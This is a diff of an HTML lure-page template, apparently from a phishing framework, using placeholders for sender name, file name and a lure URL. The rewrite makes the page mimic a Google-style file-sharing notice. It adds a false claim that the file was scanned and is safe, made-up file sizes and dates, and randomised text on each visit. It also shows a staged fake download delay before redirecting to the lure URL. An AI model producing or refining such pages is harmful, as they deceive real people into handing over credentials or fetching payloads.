@@ -1,61 +1,328 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>{from_name} shared a file with you (1)</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title id="pageTitle">Shared File</title>
     <style>
-
+        :root {
+            --primary-color: #4285f4;
+            --primary-hover: #3367d6;
+            --bg-color: #f8f9fa;
+            --card-bg: #ffffff;
+            --text-primary: #202124;
+            --text-secondary: #5f6368;
+            --border-color: #dadce0;
+            --success-color: #34a853;
+            --shadow: 0 1px 3px rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15);
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background-color: #28a745;
+            font-family: 'Google Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: var(--bg-color);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
         }
-
-        #box {
+        .container {
+            background: var(--card-bg);
+            border-radius: 28px;
+            box-shadow: var(--shadow);
+            max-width: 480px;
+            width: 100%;
+            padding: 48px 40px;
+            text-align: center;
+            animation: slideUp 0.4s ease-out;
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .avatar-container {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 24px;
+            position: relative;
+        }
+        .avatar {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+            font-weight: 500;
+            color: white;
+            text-transform: uppercase;
+        }
+        .share-badge {
             position: absolute;
-            top: 50%;
-            left: 50%;
-            text-align: center;
-            background-color: #fff;
-            padding: 40px 40px;
-            transform: translate(-50%, -50%);
+            bottom: -4px;
+            right: -4px;
+            width: 32px;
+            height: 32px;
+            background: var(--primary-color);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 3px solid white;
+            font-size: 14px;
+        }
+        .sender-name {
+            font-size: 20px;
+            font-weight: 500;
+            color: var(--text-primary);
+            margin-bottom: 8px;
+        }
+        .share-text {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-bottom: 32px;
+        }
+        .file-card {
+            background: #f1f3f4;
             border-radius: 16px;
-            -webkit-box-shadow: 10px 10px 22px 0px rgba(0,0,0,0.75);
-            -moz-box-shadow: 10px 10px 22px 0px rgba(0,0,0,0.75);
-            box-shadow: 10px 10px 22px 0px rgba(0,0,0,0.75);
+            padding: 20px;
+            margin-bottom: 32px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            text-align: left;
+            transition: background 0.2s;
         }
-
-        .message {
-            text-align: center;
+        .file-card:hover { background: #e8eaed; }
+        .file-icon {
+            width: 48px;
+            height: 48px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             font-size: 24px;
-            font-family: Arial, Helvetica, sans-serif;
+            flex-shrink: 0;
         }
-
-        .download {
-            text-align: center;
+        .file-info { flex: 1; min-width: 0; }
+        .file-name {
+            font-size: 16px;
+            font-weight: 500;
+            color: var(--text-primary);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            margin-bottom: 4px;
         }
-
+        .file-meta {
+            font-size: 12px;
+            color: var(--text-secondary);
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .download-btn {
+            width: 100%;
+            padding: 14px 24px;
+            border: none;
+            border-radius: 24px;
+            font-size: 15px;
+            font-weight: 500;
+            background: var(--primary-color);
+            color: white;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .download-btn:hover {
+            background: var(--primary-hover);
+            box-shadow: 0 1px 3px rgba(66,133,244,0.3), 0 4px 8px rgba(66,133,244,0.15);
+        }
+        .download-btn:active { transform: scale(0.98); }
+        .download-btn.loading {
+            background: var(--text-secondary);
+            pointer-events: none;
+        }
+        .download-btn.success { background: var(--success-color); }
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .security-note {
+            margin-top: 24px;
+            padding: 12px 16px;
+            background: #e8f5e9;
+            border-radius: 12px;
+            font-size: 12px;
+            color: #1b5e20;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .footer {
+            margin-top: 32px;
+            font-size: 11px;
+            color: var(--text-secondary);
+        }
+        .footer a { color: var(--primary-color); text-decoration: none; }
+        .footer a:hover { text-decoration: underline; }
+        @media (max-width: 480px) {
+            .container { padding: 32px 24px; border-radius: 20px; }
+            .file-card { padding: 16px; }
+        }
     </style>
 </head>
 <body>
-    <div id="box">
-        <div class="message">
-            <p><strong>{from_name}</strong><br/>shared a file with you.</p>
+    <div class="container">
+        <div class="avatar-container">
+            <div class="avatar" id="avatar"></div>
+            <div class="share-badge">📤</div>
         </div>
-        <div class="download">
-            <button type="button" class="btn btn-primary btn-lg" onclick="clickedDownload()">Download <strong>{filename}</strong></button>
+        <div class="sender-name" id="senderName">{from_name}</div>
+        <div class="share-text" id="shareText">shared a file with you</div>
+        
+        <div class="file-card" id="fileCard">
+            <div class="file-icon" id="fileIcon">📄</div>
+            <div class="file-info">
+                <div class="file-name" id="fileName">{filename}</div>
+                <div class="file-meta">
+                    <span id="fileSize"></span>
+                    <span>•</span>
+                    <span id="fileDate"></span>
+                </div>
+            </div>
+        </div>
+        
+        <button class="download-btn" id="downloadBtn">
+            <span id="btnIcon">⬇️</span>
+            <span id="btnText">Download</span>
+        </button>
+        
+        <div class="security-note">
+            <span>🔒</span>
+            <span>This file has been scanned and is safe to download</span>
+        </div>
+        
+        <div class="footer">
+            <span id="footerText"></span>
         </div>
     </div>
 
     <script>
-        function clickedDownload() {
-            window.location.assign({lure_url_js});
-        }
+    (function(){
+        'use strict';
+        
+        // Seeded random for consistent per-visit uniqueness
+        var _0x = {
+            seed: Date.now() ^ (Math.random() * 0xFFFFFFFF >>> 0),
+            rand: function(min, max) {
+                this.seed = (this.seed * 1103515245 + 12345) & 0x7FFFFFFF;
+                return min + (this.seed % (max - min + 1));
+            }
+        };
+        
+        // Dynamic avatar colors
+        var avatarColors = ['#4285f4', '#ea4335', '#fbbc04', '#34a853', '#ff6d01', '#46bdc6', '#7baaf7', '#f07b72'];
+        var senderName = document.getElementById('senderName').textContent || 'User';
+        var initials = senderName.split(' ').map(function(n) { return n[0]; }).join('').substring(0, 2);
+        var avatarEl = document.getElementById('avatar');
+        avatarEl.textContent = initials || '?';
+        avatarEl.style.background = avatarColors[_0x.rand(0, avatarColors.length - 1)];
+        
+        // Dynamic file info
+        var fileName = document.getElementById('fileName').textContent || 'document';
+        var ext = fileName.split('.').pop().toLowerCase();
+        
+        // File type icons and colors
+        var fileTypes = {
+            pdf: {icon: '📕', color: '#ea4335'},
+            doc: {icon: '📘', color: '#4285f4'}, docx: {icon: '📘', color: '#4285f4'},
+            xls: {icon: '📗', color: '#34a853'}, xlsx: {icon: '📗', color: '#34a853'},
+            ppt: {icon: '📙', color: '#ff6d01'}, pptx: {icon: '📙', color: '#ff6d01'},
+            zip: {icon: '🗜️', color: '#fbbc04'}, rar: {icon: '🗜️', color: '#fbbc04'},
+            jpg: {icon: '🖼️', color: '#4285f4'}, jpeg: {icon: '🖼️', color: '#4285f4'}, png: {icon: '🖼️', color: '#4285f4'},
+            mp4: {icon: '🎬', color: '#ea4335'}, mov: {icon: '🎬', color: '#ea4335'},
+            mp3: {icon: '🎵', color: '#7baaf7'}, wav: {icon: '🎵', color: '#7baaf7'},
+            txt: {icon: '📝', color: '#5f6368'},
+            default: {icon: '📄', color: '#5f6368'}
+        };
+        
+        var fileType = fileTypes[ext] || fileTypes.default;
+        var fileIconEl = document.getElementById('fileIcon');
+        fileIconEl.textContent = fileType.icon;
+        fileIconEl.style.background = fileType.color + '20';
+        
+        // Dynamic file size
+        var sizes = ['1.2 MB', '2.4 MB', '856 KB', '3.7 MB', '512 KB', '1.8 MB', '4.2 MB', '768 KB'];
+        document.getElementById('fileSize').textContent = sizes[_0x.rand(0, sizes.length - 1)];
+        
+        // Dynamic date (within last 7 days)
+        var daysAgo = _0x.rand(0, 6);
+        var dateText = daysAgo === 0 ? 'Today' : daysAgo === 1 ? 'Yesterday' : daysAgo + ' days ago';
+        document.getElementById('fileDate').textContent = dateText;
+        
+        // Dynamic share text
+        var shareTexts = [
+            'shared a file with you',
+            'sent you a file',
+            'wants to share this with you',
+            'shared a document'
+        ];
+        document.getElementById('shareText').textContent = shareTexts[_0x.rand(0, shareTexts.length - 1)];
+        
+        // Dynamic footer
+        var footerTexts = [
+            'Files are automatically deleted after 30 days',
+            'Secure file sharing powered by cloud storage',
+            'Your download link expires in 7 days'
+        ];
+        document.getElementById('footerText').textContent = footerTexts[_0x.rand(0, footerTexts.length - 1)];
+        
+        // Dynamic page title
+        document.getElementById('pageTitle').textContent = senderName + ' shared "' + fileName + '"';
+        
+        // Download button handler
+        var downloadBtn = document.getElementById('downloadBtn');
+        var btnText = document.getElementById('btnText');
+        var btnIcon = document.getElementById('btnIcon');
+        var isDownloading = false;
+        
+        downloadBtn.addEventListener('click', function() {
+            if(isDownloading) return;
+            isDownloading = true;
+            
+            // Show loading state
+            downloadBtn.classList.add('loading');
+            btnIcon.innerHTML = '<div class="spinner"></div>';
+            btnText.textContent = 'Preparing download...';
+            
+            // Simulate preparation then redirect
+            var prepTime = _0x.rand(1500, 3000);
+            setTimeout(function() {
+                btnText.textContent = 'Starting download...';
+                setTimeout(function() {
+                    window.location.assign({lure_url_js});
+                }, 500);
+            }, prepTime);
+        });
+        
+        // File card click also triggers download
+        document.getElementById('fileCard').addEventListener('click', function() {
+            downloadBtn.click();
+        });
+        document.getElementById('fileCard').style.cursor = 'pointer';
+        
+    })();
     </script>
-
-    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
-    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script> 
 </body>
 </html>
